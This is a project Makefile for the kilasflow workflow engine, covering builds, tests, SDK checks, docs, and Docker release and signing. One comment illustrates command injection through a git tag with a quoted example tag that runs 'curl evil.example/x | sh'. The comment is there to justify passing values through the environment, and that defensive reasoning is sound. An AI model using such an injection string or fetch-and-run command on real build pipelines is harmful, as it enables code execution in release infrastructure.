APP_NAME    := kilasflow
GO          := go
WEB_DIR     := web
SDK_DIR     := sdk
DOCS_DIR    := docs
DIST_DIR    := internal/web/dist
BIN_DIR     := bin
# The registry spec `make sdk-verify-published` checks. Empty means
# @kilasflow/sdk@<the version in sdk/package.json>.
SDK_SPEC    ?=
VERSION     ?= $(shell git describe --tags --always --dirty 2>/dev/null || echo "0.1.0-dev")
# Read from the environment for the reason IMAGE_ARGS is: a git ref name may
# contain a double quote, so `-ldflags="… -X main.version=$(VERSION)"` lets a
# crafted tag close the quoting and run a command during an ordinary build.
LDFLAGS     := -s -w -X main.version=$$KILASFLOW_VERSION
GO_BIN      := $(shell $(GO) env GOBIN 2>/dev/null)

# Published image coordinates. IMAGE is the product name rather than the
# repository name (k-flow) because it is what a consumer types in a `docker pull`;
# it stays overridable so a fork can publish into its own namespace without
# editing this file.
IMAGE          ?= ghcr.io/kilaslab/kilasflow
PLATFORMS      ?= linux/amd64,linux/arm64
REVISION       ?= $(shell git rev-parse HEAD 2>/dev/null || echo unknown)
SOURCE_URL     ?= https://github.com/kilaslab/kilas-flow

# Where `docker buildx --push` writes the digest of what it published. Under .tmp
# because `make clean` already removes it and .gitignore already covers it.
IMAGE_METADATA ?= .tmp/image-metadata.json

# One list shared by every image target. A locally built image and a published one
# come from the same Dockerfile and the same arguments, which is what makes
# reproducing a published image from a commit possible at all.
#
# The values are read from the environment rather than interpolated, and that is
# a security property rather than a style. VERSION reaches these recipes from
# `git describe --tags` or from a workflow's github.ref_name, and a git tag may
# legally contain a single quote — so `-t '$(VERSION)'` would let a tag named
#   v1.0.0'; curl evil.example/x | sh; '
# close the quote and run a command inside the release pipeline. Make puts a
# target-specific export straight into the child's environment without a shell
# ever parsing it, so the value below is data no matter what it contains.
IMAGE_ARGS  := --build-arg VERSION="$$KILASFLOW_VERSION" \
               --build-arg REVISION="$$KILASFLOW_REVISION" \
               --build-arg SOURCE="$$KILASFLOW_SOURCE"

# Every recipe that names an image or a version gets them this way.
#
# The capstone targets are deliberately NOT in this list. They export a
# commit-derived `KILASFLOW_VERSION` (`git describe --always`), and
# scripts/docker-tags.sh only ever publishes `vX.Y.Z`, `vX.Y` and `latest` — so
# inheriting the release coordinates made the default image under test
# `ghcr.io/kilaslab/kilasflow:<sha>`, a tag that can never be pulled. The
# capstone names its image itself: the published `latest` by default, whatever
# `KILASFLOW_CAPSTONE_IMAGE` says otherwise.
IMAGE_TARGETS := build docker docker-multiarch docker-release docker-sign smoke-docker-published
$(IMAGE_TARGETS): export KILASFLOW_IMAGE = $(IMAGE)
$(IMAGE_TARGETS): export KILASFLOW_VERSION = $(VERSION)
$(IMAGE_TARGETS): export KILASFLOW_REVISION = $(REVISION)
$(IMAGE_TARGETS): export KILASFLOW_SOURCE = $(SOURCE_URL)
$(IMAGE_TARGETS): export KILASFLOW_APP_NAME = $(APP_NAME)

ifeq ($(strip $(GO_BIN)),)
GO_BIN      := $(shell $(GO) env GOPATH 2>/dev/null)/bin
endif

# `go install` writes Air to GOBIN (or GOPATH/bin), which need not be on a
# developer's shell PATH. Keep the override for a system-managed Air binary.
AIR         ?= $(GO_BIN)/air

.DEFAULT_GOAL := help

.PHONY: help
help: ## Show this help
	@echo "KilasFlow development commands"
	@echo ""
	@grep -hE '^[a-zA-Z_-]+:.*?## ' $(MAKEFILE_LIST) \
		| awk 'BEGIN {FS = ":.*?## "}; {printf "  \033[36m%-14s\033[0m %s\n", $$1, $$2}'
	@echo ""
	@echo "Dev servers:  Go on :8080, Vite on :5173 (open :5173)"

.PHONY: setup
setup: ## Install all dependencies
	$(GO) mod download
	$(GO) install github.com/air-verse/air@v1.67.4
	cd $(WEB_DIR) && pnpm install

# Override when a port is taken by another project:
#   make dev KILASFLOW_WEB_PORT=5180
KILASFLOW_WEB_PORT ?= 5173
export KILASFLOW_WEB_PORT

.PHONY: dev
dev: ## Run backend and frontend with hot reload
	@echo "Go   -> http://127.0.0.1:8080"
	@echo "Vite -> http://127.0.0.1:$(KILASFLOW_WEB_PORT)   <- open this one"
	@trap 'kill 0' INT TERM EXIT; \
		$(MAKE) dev-api & api_pid=$$!; \
		$(MAKE) dev-web & web_pid=$$!; \
		while kill -0 "$$api_pid" 2>/dev/null && kill -0 "$$web_pid" 2>/dev/null; do sleep 1; done; \
		exit 1

.PHONY: dev-api
dev-api: ## Run the Go backend with Air
	$(AIR)

.PHONY: dev-web
dev-web: ## Run the SvelteKit dev server
	cd $(WEB_DIR) && pnpm dev

# The build owns DIST_DIR outright: everything under it is ignored by git, and
# the only committed file there is the .gitkeep recreated below. Nothing this
# target writes is tracked, which is what keeps `git describe --dirty` honest
# and the tree clean after a build.
.PHONY: build-web
build-web: ## Build the SPA into the Go embed directory
	cd $(WEB_DIR) && pnpm build
	rm -rf $(DIST_DIR)
	mkdir -p $(DIST_DIR)
	cp -R $(WEB_DIR)/build/. $(DIST_DIR)/
	@touch $(DIST_DIR)/.gitkeep

.PHONY: build
build: ## Build the production binary (run build-web first for the real SPA)
	CGO_ENABLED=0 $(GO) build \
		-trimpath \
		-ldflags="$(LDFLAGS)" \
		-o $(BIN_DIR)/$(APP_NAME) \
		./cmd/$(APP_NAME)
	@echo "built $(BIN_DIR)/$(APP_NAME) ($$KILASFLOW_VERSION)"

.PHONY: build-all
build-all: build-web build ## Full production build: SPA embedded in the binary

# A build must leave tracked files alone. The regression this guards is real and
# silent: a committed dist/index.html placeholder was overwritten by build-web,
# which made the tree dirty before `git describe --dirty` ran and stamped every
# binary, image and health response "-dirty" on a clean checkout. Untracked
# output (everything else under DIST_DIR) is ignored on purpose — that is what
# the frontend build is allowed to write.
#
# Runs build-all first, so it needs a tree that is already clean: commit before
# running it by hand. In CI that is the checkout.
.PHONY: build-clean-check
build-clean-check: build-all ## Fail if a build modifies a tracked file
	@test -z "$$(git status --porcelain --untracked-files=no)" || { \
		echo "build-clean-check: the build modified tracked files:" >&2; \
		git status --porcelain --untracked-files=no >&2; \
		exit 1; \
	}
	@echo "build-clean-check: no tracked file changed"

.PHONY: run
run: build ## Build and run the binary
	./$(BIN_DIR)/$(APP_NAME)

# The PostgreSQL-gated packages run against the one database named by
# KILASFLOW_TEST_POSTGRES_DSN, and internal/database's migration tests drop
# every KilasFlow table on entry. `go test ./...` runs packages in parallel by
# default, so one package's reset deletes another's schema mid-test — the
# failures read as "relation executions does not exist" in whichever test lost
# the race. A DSN therefore turns package parallelism off (see
# .pine/memory/persistence.md); with no DSN every one of those tests skips and
# the default is kept.
.PHONY: test
test: ## Run Go tests
	$(GO) test ./... -race $(if $(KILASFLOW_TEST_POSTGRES_DSN),-p 1)

.PHONY: web-test
web-test: ## Run the frontend test suite
	cd $(WEB_DIR) && pnpm test

.PHONY: sdk-check
sdk-check: ## Typecheck the host SDK
	cd $(SDK_DIR) && pnpm check

.PHONY: sdk-test
sdk-test: ## Run the host SDK test suite
	cd $(SDK_DIR) && pnpm test

# The SDK ships compiled `dist/`, so a type error that only `tsc -p
# tsconfig.build.json` reaches would otherwise surface at publish time.
.PHONY: sdk-build
sdk-build: ## Build the host SDK into sdk/dist
	cd $(SDK_DIR) && pnpm build

# `SDK_VERSION` in sdk/src/version.ts mirrors `version` in sdk/package.json by
# contract (see docs/src/content/docs/reference/api-contract.md), and the
# manifest licence must stay Apache-2.0 to match the repository root LICENSE.
# Both are one-line node assertions rather than a script file because there is
# nothing to reuse: two reads, two comparisons, and a non-zero exit naming
# the fix. The SDK_VERSION match is extracted with a plain regex on purpose —
# importing the module would execute it, and this check must stay a read.
.PHONY: sdk-version-check
sdk-version-check: ## Fail if the SDK manifest disagrees with its version source
	node -e 'const fs=require("node:fs");const m=JSON.parse(fs.readFileSync("sdk/package.json","utf8"));const src=fs.readFileSync("sdk/src/version.ts","utf8");const v=(src.match(/export const SDK_VERSION\s*=\s*["\x27]([^"\x27]+)/)||[])[1];let ok=true;if(m.version!==v){console.error("sdk/package.json version ("+m.version+") != SDK_VERSION ("+v+"); bump both together");ok=false}if(m.license!=="Apache-2.0"){console.error("sdk/package.json license ("+m.license+") must be Apache-2.0 to match the repository LICENSE");ok=false}process.exit(ok?0:1)'

# The package as a consumer receives it: pack the tarball, install it into a
# scratch project outside the repository, typecheck it under `bundler`, `node16`
# and `nodenext`, and import all three subpaths at runtime. `sdk-check` cannot
# see this failure: it resolves with `bundler`, so a relative re-export that
# dropped its `.js` extension stays green there and fails every `node16`
# consumer with TS2835 — see the two traps in the ticket.
.PHONY: sdk-package-check
sdk-package-check: ## Pack the SDK and check the tarball as a consumer receives it
	cd $(SDK_DIR) && node scripts/check-package.mjs

# The example, run the way its README tells a consumer to run it: pack the SDK,
# copy examples/host-page into a scratch directory outside the repository,
# install the tarball there, start a stub KilasFlow and the example's own
# backend, and drive it over HTTP. The static route is probed with raw `..%2f`
# requests, which is the only way to see the traversal fetch would normalise.
.PHONY: sdk-example-check
sdk-example-check: ## Run the host-page example against the packed SDK
	cd $(SDK_DIR) && node scripts/check-example.mjs

# The registry half of the same check, for after a release. Expected to fail
# with npm E404 until the first release is published, which is why Criterion 1
# is not ticked; SDK_SPEC=@kilasflow/sdk@0.2.0 checks another version.
.PHONY: sdk-verify-published
sdk-verify-published: export KILASFLOW_SDK_SPEC = $(SDK_SPEC)
sdk-verify-published: ## Install @kilasflow/sdk from npm and check it (needs a published release)
	cd $(SDK_DIR) && node scripts/check-package.mjs --registry "$$KILASFLOW_SDK_SPEC"

# One list, run by a laptop and by the release workflow, so the two cannot
# diverge. Serial on purpose: `sdk-build` removes `dist` before compiling, so a
# `-j` run that started the pack first would package a half-written tree.
.PHONY: sdk-release-check
sdk-release-check: ## Run every gate a release must pass (see sdk/RELEASING.md)
	$(MAKE) sdk-check
	$(MAKE) sdk-test
	$(MAKE) sdk-build
	$(MAKE) sdk-version-check
	$(MAKE) generate-types-check
	$(MAKE) sdk-package-check
	$(MAKE) sdk-example-check

# The documentation site. Like the SDK targets above, these assume `pnpm install`
# has already been run in the directory — `make setup` deliberately installs only
# web/, because that is the one a contributor needs to run the product, and
# making every Go change wait on three dependency trees would be a poor trade.
#
# docs/ is a third pnpm project and not part of the binary: nothing here is
# copied into $(DIST_DIR) or reached by a go:embed directive, which is the whole
# reason the site is a sibling of web/ rather than a route inside it.
.PHONY: docs
docs: ## Run the documentation site dev server
	cd $(DOCS_DIR) && pnpm dev

# Link validation runs on build only — `astro dev` does not do it — so this is
# the target CI calls. A broken internal link fails it exactly like a syntax
# error would, which is the point: a page renamed by a later change cannot
# quietly orphan a link to it.
#
# DOCS_SITE and DOCS_BASE are read by astro.config.mjs and left empty here. A
# local build then serves from the root, and the deployment sets them from the
# repository it is actually publishing to, so the subpath is never guessed.
.PHONY: docs-build
docs-build: ## Build the documentation site, validating internal links
	cd $(DOCS_DIR) && pnpm build

# orval loads web/tsconfig.json, which extends the generated
# .svelte-kit/tsconfig.json. That file is gitignored, so on a fresh clone — and
# on every CI runner — the API generators die with "File
# './.svelte-kit/tsconfig.json' not found" before they ever reach the spec.
# `pnpm check` happens to sync as a side effect, which is why this only bites
# when the generators run on their own.
.PHONY: web-sync
web-sync:
	cd $(WEB_DIR) && pnpm exec svelte-kit sync

# Both generators boot a real binary via scripts/openapi-spec.mjs and read its
# OpenAPI document. The binary they build embeds whatever is in DIST_DIR, which
# a fresh clone leaves holding only its .gitkeep — the placeholder page the
# binary then serves comes from internal/web/placeholder, not from there.
#
# Make cannot express the `generate:api` spelling the package scripts use — a
# colon is Make's rule separator — so the targets are hyphenated.
.PHONY: generate-api
generate-api: web-sync ## Regenerate the web API client from a freshly built binary
	cd $(WEB_DIR) && pnpm generate:api

.PHONY: generate-api-check
generate-api-check: web-sync ## Fail if the committed web API client is stale
	cd $(WEB_DIR) && pnpm generate:api:check

.PHONY: generate-types
generate-types: ## Regenerate the SDK types from a freshly built binary
	cd $(SDK_DIR) && pnpm generate:types

.PHONY: generate-types-check
generate-types-check: ## Fail if the committed SDK types are stale
	cd $(SDK_DIR) && pnpm generate:types:check

# The public API reference is generated from the OpenAPI document of a real
# binary, not written by hand. Like the two targets above this one boots a
# server via scripts/openapi-spec.mjs. The committed pages live under docs/ but
# the script itself needs only node and go, so there is no pnpm step here.
.PHONY: generate-api-reference
generate-api-reference: ## Regenerate the docs API reference from a freshly built binary
	node scripts/generate-api-reference.mjs

.PHONY: generate-api-reference-check
generate-api-reference-check: ## Fail if the committed docs API reference is stale
	node scripts/generate-api-reference.mjs --check

# The configuration reference and the example YAML are generated from the
# Config structs, not written by hand. Unlike the targets above this one needs
# no binary: it reads source and defaults only, so a struct change with no
# regenerated reference fails the check below.
.PHONY: generate-config-reference
generate-config-reference: ## Regenerate the configuration reference and config.example.yaml
	$(GO) run ./scripts/config-reference.go

.PHONY: generate-config-reference-check
generate-config-reference-check: ## Fail if the generated configuration files are stale
	$(GO) run ./scripts/config-reference.go --check

# skills/index.json is the bundle's index: rendered from the SKILL.md
# frontmatter, never hand-written, and refused when the bundle breaks one of its
# own rules. Like the configuration reference above it needs no binary.
.PHONY: generate-skills-index
generate-skills-index: ## Regenerate skills/index.json from the bundle frontmatter
	$(GO) run ./scripts/skills-index

.PHONY: generate-skills-index-check
generate-skills-index-check: ## Fail if skills/index.json is stale
	$(GO) run ./scripts/skills-index --check

# The router skill's compact command reference is the one part of the bundle that
# is a product fact rather than prose: it is rendered from the binary's own
# command tree (`kilasflow help --json`) by scripts/skills-command-reference, so
# the surface an agent reads in turn one cannot name a verb the binary does not
# implement. The generator builds and runs the CLI itself, so this needs the Go
# toolchain and nothing else.
.PHONY: generate-skills-command-reference
generate-skills-command-reference: ## Regenerate the router skill's command reference from the CLI's command tree
	$(GO) run ./scripts/skills-command-reference

.PHONY: generate-skills-command-reference-check
generate-skills-command-reference-check: ## Fail if the router skill's command reference is stale
	$(GO) run ./scripts/skills-command-reference --check

# The bundle's own gate, and the design's G5. Two halves, because the drift it
# guards has two shapes.
#
# The round trip is the half only a real binary can prove: an installation is
# written by the binary's own embedded bundle and read back by `skills check`,
# so a bundle that installs differently from the way it is checked — or a check
# that compares the wrong directory — fails here and nowhere else. It runs in a
# scratch directory outside the checkout, because a check against `.agents/skills`
# would report whatever a developer's last install left there.
#
# The test half is G1–G4, which are ordinary tests so they cannot be skipped by
# forgetting a target (design §5.7). They run here as well as in `go test ./...`
# because this target is the one command a review and a session run: a skill
# naming a verb the binary does not implement has to fail `make skills-check`,
# and `skills check` alone cannot see that — it compares bytes, and bytes that
# were written from the bundle always match it.
.PHONY: skills-check
skills-check: build ## Fail if the bundle has drifted from the product or an install disagrees with this binary
	$(GO) test -count=1 ./internal/skills/...
	@scratch=$$(mktemp -d) && trap 'rm -rf "$$scratch"' EXIT INT TERM; \
		./$(BIN_DIR)/$(APP_NAME) skills install --target "dir:$$scratch" >/dev/null && \
		./$(BIN_DIR)/$(APP_NAME) skills check --target "dir:$$scratch"

.PHONY: test-cover
test-cover: ## Run Go tests with a coverage report
	$(GO) test ./... -coverprofile=coverage.out
	$(GO) tool cover -func=coverage.out | tail -1

.PHONY: lint
lint: ## Vet Go code and typecheck the frontend
	$(GO) vet ./...
	@test -z "$$(gofmt -l . | grep -v '^$(WEB_DIR)/')" || \
		{ echo "gofmt needed:"; gofmt -l . | grep -v '^$(WEB_DIR)/'; exit 1; }
	cd $(WEB_DIR) && pnpm check
	cd $(WEB_DIR) && pnpm test

.PHONY: tidy
tidy: ## Tidy go.mod
	$(GO) mod tidy

.PHONY: docker
docker: ## Build the Docker image for this machine's architecture
	docker build $(IMAGE_ARGS) \
		-t "$$KILASFLOW_APP_NAME:$$KILASFLOW_VERSION" \
		-t "$$KILASFLOW_APP_NAME:latest" .

# Cross-builds both published architectures and throws the result away. This is
# what a pull request runs: without it the arm64 path is first exercised while
# cutting a release, which is the worst possible moment to discover it broken.
# cacheonly rather than --load because a manifest list cannot be loaded into a
# local daemon, and rather than --push because a pull request must not publish.
.PHONY: docker-multiarch
docker-multiarch: ## Cross-build the image for every published architecture, publishing nothing
	docker buildx build --platform $(PLATFORMS) $(IMAGE_ARGS) --output type=cacheonly .

# The one command that publishes. VERSION must be a release tag: scripts/docker-tags.sh
# rejects anything else, so a `git describe` hash can never reach the registry as
# `latest`. SBOM and provenance are attached at the start because attestations are
# awkward to add once consumers have started trusting unattested images.
.PHONY: docker-release
docker-release: ## Build and push the multi-architecture image (VERSION must be a vX.Y.Z tag)
	@mkdir -p $(dir $(IMAGE_METADATA))
	docker buildx build \
		--platform $(PLATFORMS) \
		$(IMAGE_ARGS) \
		$$(sh scripts/docker-tags.sh) \
		--sbom=true \
		--provenance=mode=max \
		--metadata-file $(IMAGE_METADATA) \
		--push \
		.

# Separate from docker-release because signing needs an OIDC token that only a
# CI run has — folding it into the build would make the release target impossible
# to run by hand. Signs the digest rather than a tag: a tag can move between the
# push and the signature, and then the signature covers something else.
.PHONY: docker-sign
docker-sign: ## Sign the image docker-release just pushed (needs cosign and an OIDC token)
	@test -f $(IMAGE_METADATA) || { \
		echo "$(IMAGE_METADATA) is missing; run make docker-release first" >&2; exit 1; }
	@digest=$$(sed -n 's/.*"containerimage.digest"[^"]*"\([^"]*\)".*/\1/p' $(IMAGE_METADATA)); \
	case "$$digest" in \
		sha256:*) ;; \
		*) echo "no image digest in $(IMAGE_METADATA); run make docker-release first" >&2; exit 1 ;; \
	esac; \
	cosign sign --yes "$$KILASFLOW_IMAGE@$$digest"

.PHONY: corpus
corpus: ## Fetch the n8n importer regression corpus (needs KILASFLOW_N8N_REFERENCE)
	scripts/corpus-sync.sh

.PHONY: node-packs
node-packs: ## Regenerate the committed node packs from their vendored specs
	@for version in 202409 202502; do \
	  $(GO) run ./cmd/nodepackgen \
	    -spec third_party/waha/openapi-$$version.json \
	    -manifest packs/waha/manifest-$$version.json \
	    -out packs/waha/pack-$$version.json \
	    -trigger-out packs/waha/pack-trigger-$$version.json \
	    -report packs/waha/REPORT-$$version.md || exit 1; \
	done

.PHONY: corpus-baseline
corpus-baseline: ## Rescore the corpus and rewrite BASELINE.md and baseline.json
	$(GO) test ./internal/interop/n8n/corpus -update-baseline -count=1 -v

# TestCorpusScoreboard skips when .corpus/ has not been materialised, and a skip
# reads as a pass in a summarised test run. `-v` is the whole point of this
# target: it prints either the comparison against baseline.json or the skip
# line naming the sync command, so the state of the corpus is never inferred.
.PHONY: corpus-check
corpus-check: ## Verify BASELINE.md, or say the corpus is not materialised
	$(GO) test ./internal/interop/n8n/corpus -count=1 -v

# The Code-node compatibility corpus (EPIC-tjnr1z P7): the JavaScript of the
# most-viewed public n8n templates, fetched into the gitignored
# internal/jsrun/corpus/fixtures/ and pinned by MANIFEST.json. js-corpus-check
# is verbose for the same reason corpus-check is: it prints the comparison or
# the skip line, never a silent pass.
.PHONY: js-corpus
js-corpus: ## Fetch the Code-node corpus from api.n8n.io and verify it against MANIFEST.json
	scripts/code-corpus-sync.sh

.PHONY: js-corpus-baseline
js-corpus-baseline: ## Rescore the Code-node corpus and rewrite its BASELINE.md and baseline.json
	$(GO) test ./internal/jsrun/corpus -run TestCodeCorpusScoreboard -update-baseline -count=1 -v

.PHONY: js-corpus-check
js-corpus-check: ## Verify the Code-node corpus baseline, or say the corpus is not materialised
	$(GO) test ./internal/jsrun/corpus -count=1 -v

# Dev-only: needs node 24 on PATH. Runs every corpus body under jsrun and under
# Node through a KilasFlow-authored roots harness (scripts/js-diff/harness.mjs)
# and prints the diff summary. Run it before a goja bump. Never part of CI.
.PHONY: js-diff
js-diff: ## Diff jsrun against Node.js over the Code-node corpus (dev-only; needs node 24)
	$(GO) test ./internal/jsrun/corpus -run TestJSDiff -js-diff -count=1 -v

# The Code node's load test (FEAT-vjjs8t): Code-node executions at several
# concurrency levels through the real worker pool, a trivial body and a
# 1000-item transform, reporting p50/p95/p99 latency and executions per second.
# The machine's load average is printed before and after, because the numbers
# mean little without it.
.PHONY: js-load
js-load: ## Measure Code-node latency percentiles and throughput under concurrent load
	@uptime
	$(GO) test ./internal/jsworker -run '^$$' -bench BenchmarkCodeNodeUnderLoad -benchtime 400x -count 1
	@uptime

.PHONY: smoke-sqlite
smoke-sqlite: ## Prove the embedded binary against a fresh SQLite database
	sh scripts/smoke-sqlite.sh

# The repository is github.com/kilaslab/kilas-flow, and every coordinate a
# consumer reads — Go module path, image, source URL, OCI label, docs, SDK
# metadata — has to say so. The old organisation name appeared throughout and
# belongs to nobody, which is a squatting target rather than a typo — so this
# guard greps for it, and this comment deliberately does not spell it out (the
# guard cannot except its own prose without weakening itself). See
# scripts/check-coordinates.sh for what is checked and what is excepted
# (`.pine/`, whose tickets record the rename and quote the old path on purpose).
.PHONY: coordinates-check
coordinates-check: ## Fail if a published coordinate names the wrong GitHub owner
	sh scripts/check-coordinates.sh

.PHONY: smoke-dev
smoke-dev: ## Prove the Vite development proxy against a temporary Go server
	sh scripts/smoke-dev.sh

.PHONY: smoke-docker
smoke-docker: ## Prove the non-root Docker image against a persisted SQLite bind mount
	sh scripts/smoke-docker.sh

# The same assertions against what was actually published. A locally built image
# cannot prove the part that only exists in a registry: that pulling one tag on
# this machine resolves through the manifest list to an image this architecture
# can run. Run on a release runner after the push, and by hand on an arm64 laptop
# to prove the other half of the list.
.PHONY: smoke-docker-published
smoke-docker-published: ## Prove the published image by pulling it (VERSION must be a published tag)
	KILASFLOW_SMOKE_IMAGE="$$KILASFLOW_IMAGE:$$KILASFLOW_VERSION" \
		KILASFLOW_SMOKE_PULL=1 sh scripts/smoke-docker.sh

.PHONY: smoke-postgres
smoke-postgres: ## Prove the Docker image against the temporary Compose PostgreSQL service
	sh scripts/smoke-postgres.sh

# The Playwright suite builds the binary and the SPA itself (global-setup runs
# `make build-all`), so this target only needs the e2e dependencies installed
# — plus web's, for the SPA build. CI installs both before calling it.
.PHONY: test-e2e
test-e2e: ## Run the Playwright end-to-end suite against a real binary and SPA
	cd e2e && pnpm test

# Run after test-e2e (and after a failure, hence the CI `if: always()`): the
# JSON report it reads exists either way. A skipped test is not a passing test,
# and this is the step that says so — see e2e/skip-budget.json.
.PHONY: e2e-skip-budget
e2e-skip-budget: ## Fail if the e2e suite skipped more than its recorded budget
	node e2e/scripts/skip-budget.mjs

# On-demand only: single-machine timings with third-party-adjacent variance
# make it a bad merge gate and a good investigation tool. FEAT-8mymac.
# The default BENCH_N8N=managed starts the pinned throwaway n8n container,
# creates its owner account with an in-memory password, measures both engines
# and removes the container; BENCH_N8N=off measures the KilasFlow half alone
# and publishes it as PRELIMINARY. Never a PR gate.
.PHONY: bench-compare
bench-compare: build ## Run the KilasFlow-vs-n8n runtime benchmark (30 runs/workflow)
	node e2e/benchmark/run.mjs

# The benchmark's own unit tests: the ABBA schedule, the variance bounds, the
# bootstrap interval, full-body equivalence and the summariser. Node builtins
# only — no engine, no Docker, no network — so it is fast enough to run on
# demand. Deliberately not wired into CI, for the same reason bench-compare
# is not: it is a method check, not a product gate.
.PHONY: bench-test
bench-test: ## Run the benchmark method's unit tests (no engine, no Docker)
	node --test e2e/benchmark/*.test.mjs

# The epic acceptance capstone (FEAT-5fhj6p): the four proofs of EPIC-m42s3g
# against a docker IMAGE, the real Telegram Bot API, a real WAHA server and the
# npm registry. On demand and on a schedule, never on a pull request — it needs
# docker, credentials and third-party availability. It lives in e2e/capstone and
# on its own config, so `test-e2e` and its skip budget never see it.
#
# The leading `-` is deliberate: the verdict is the report step's (exit 0/1/2),
# not Playwright's. A run whose proofs were skipped or unavailable must still
# reach `e2e-capstone-report`, which is where the reason and the exit code live.
.PHONY: test-e2e-capstone
test-e2e-capstone: ## Run the on-demand epic capstone against a docker image
	-cd e2e && rm -rf capstone-results && pnpm exec playwright test -c playwright.capstone.config.ts

.PHONY: e2e-capstone-report
e2e-capstone-report: ## Exit 0/1/2 on the last capstone run's verdict
	node e2e/scripts/capstone-report.mjs

# The same verdict, read the way .github/workflows/capstone.yml reads it: an
# unavailable third party does not fail a scheduled run, because a red arrow
# nobody can act on is a red arrow people stop reading. An assertion failure —
# exit 1 — still does. The verdict in the report is unchanged either way.
.PHONY: e2e-capstone-scheduled
e2e-capstone-scheduled: ## The capstone's verdict with availability treated as success
	node e2e/scripts/capstone-report.mjs --unavailable-ok

.PHONY: clean
clean: ## Remove build artifacts
	rm -rf $(BIN_DIR) .tmp coverage.out
	rm -rf $(SDK_DIR)/dist $(SDK_DIR)/.tmp
	rm -rf $(WEB_DIR)/build $(WEB_DIR)/.svelte-kit
	rm -rf $(DOCS_DIR)/dist $(DOCS_DIR)/.astro
	# The embed directive needs at least one file under DIST_DIR, so the
	# directory is recreated around its tracked .gitkeep rather than removed.
	rm -rf $(DIST_DIR)
	@mkdir -p $(DIST_DIR) && touch $(DIST_DIR)/.gitkeep

# The CLI is the surface an agent drives, so its proof is the same shape as the
# server's: boot a real binary, then assert on exit codes and envelopes rather
# than on the absence of a crash. Auth is on for this run (the script explains
# why), and nothing here needs a database other than the script's own SQLite
# file.
.PHONY: smoke-cli
smoke-cli: ## Prove the agent CLI against a booted server
	sh scripts/smoke-cli.sh
